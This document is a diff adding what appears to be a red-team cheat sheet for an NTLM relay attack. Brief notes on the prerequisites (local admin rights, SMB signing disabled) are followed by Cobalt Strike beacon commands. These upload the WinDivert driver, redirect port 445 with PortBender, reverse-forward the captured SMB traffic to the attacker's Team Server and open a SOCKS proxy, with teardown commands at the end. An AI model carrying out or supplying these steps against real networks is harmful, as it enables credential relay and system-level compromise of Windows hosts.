@@ -1,0 +1,29 @@
+# NTLM Relay Attack
+
+# This attack leverages SMB authentication sessions to access a target machine, 
+# granting a system shell if successful. Key prerequisites include:
+
+# - The authenticating user must have Local Admin access on the relayed host.
+# - SMB signing should be disabled.
+
+# 445 Port Forwarding and Tunneling
+
+# - In scenarios where direct network introduction isn’t feasible, traffic on port 445 needs to be forwarded and tunneled.
+# - Tools like PortBender help in redirecting port 445 traffic to another port, which is essential
+# - when local admin access is available for driver loading.
+
+# - PortBender setup and operation in Cobalt Strike:
+
+Cobalt Strike -> Script Manager -> Load (Select PortBender.cna)
+
+beacon> cd C:\Windows\system32\drivers # Navigate to drivers directory
+beacon> upload C:\PortBender\WinDivert64.sys # Upload driver
+beacon> PortBender redirect 445 8445 # Redirect traffic from port 445 to 8445
+beacon> rportfwd 8445 127.0.0.1 445 # Route traffic from port 8445 to Team Server
+beacon> socks 1080 # Establish a SOCKS proxy on port 1080
+
+# Termination commands
+beacon> jobs
+beacon> jobkill 0
+beacon> rportfwd stop 8445
+beacon> socks stop
